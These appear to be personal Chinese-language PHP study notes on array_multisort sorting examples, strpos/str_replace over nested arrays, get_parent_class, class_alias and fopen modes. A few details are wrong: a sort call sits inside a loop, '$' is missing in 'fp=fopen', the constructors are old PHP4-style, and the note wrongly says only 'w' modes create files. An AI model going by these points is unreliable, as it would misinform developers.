$arr=array(
  0=>array('name'=>'jack','age'=>23),
  1=>array('name'=>'bob','age'=>12),
  2=>array('name'=>'catie','age'=>45)
  );
foreach($arr as $k=>$v){
  $age[$k] = $v['age'];
array_multisort($age,SORT_NUMERIC,SORT_ASC,$arr);
}
var_dump($arr);
官方的一个案例是：
$data[] = array('volume' => 67, 'edition' => 2);
$data[] = array('volume' => 86, 'edition' => 1);
$data[] = array('volume' => 85, 'edition' => 6);
$data[] = array('volume' => 98, 'edition' => 2);
$data[] = array('volume' => 86, 'edition' => 6);
$data[] = array('volume' => 67, 'edition' => 7);
// 取得列的列表
foreach ($data as $k => $r) {
    $volume[$k]  = $r['volume'];
    $edition[$k] = $r['edition'];
}
// 将数据根据 volume 降序排列，根据 edition 升序排列
// 把 $data 作为最后一个参数，以通用键排序
//排序优先级从左到右依次减小，最左边优先级最大
array_multisort($volume, SORT_DESC, $edition, SORT_ASC, $data);
var_dump($data);
数组不区分大小写进行排序:
$array=array("Alpha","Beta","atomic","bank");
$arr=array_map("strtolower",$array);
array_multisort($arr,SORT_ASC,SORT_STRING,$array);
var_dump($array);
多元素排序规则：
$grade = array(
  "score" => array(70, 95, 70.0, 60, "70"),
  "name" => array("Zhang San", "Li Si", "Wang Wu","Zhao Liu", "Liu Qi")
);
 // 将分数作为数值，由高到低排序           // 将名字作为字符串，由小到大排序
array_multisort($grade["score"], SORT_NUMERIC, SORT_DESC,$grade["name"], SORT_STRING,SORT_ASC);
var_dump($grade);


+++strpos的注意点+++++
二位数组的子元素的遍历问题。
$keyword = "你好春天";
$arr_season = array(
  '1'=>array('春季','春'),'2'=>array('夏季','夏'),'3'=>array('秋季','秋'),'4'=>array('冬季','冬')
);
foreach($arr_season as $hkey => $uu){
  foreach($uu as $_uu){ 
    if(strpos($keyword,$_uu)!==false){
      $keyword = str_replace($_uu, '', $keyword);
    }
  } 
}


++++get_parent_class+++++
//get_parent_class获取对象或者类的父类名，相对应的有is_subclass_of — 如果此对象是该类的子类，则返回 TRUE。
class dad{
  function dad(){
    echo "dad";
  }
}
class child extends dad{
  function child(){
    echo "I am ",get_parent_class($this), " `s son ";
  }
}
$foo = new child();


++++class_alias+++
class_alias给一个类取别名。
class foo{
  function dad(){
    echo "类foo下面的dad";
  }
}
class_alias('foo','bar');
$f= new bar;
$f->dad();


+++fopen+++
fp=fopen("file","ab"); 
"w","w+","wb","wb+"方式可以创建新文件，其他方式不可 
"a","a+","ab","ab+"为打开已存在的文件，文件使用方式为添加方式，不会覆盖原来的file文件的信息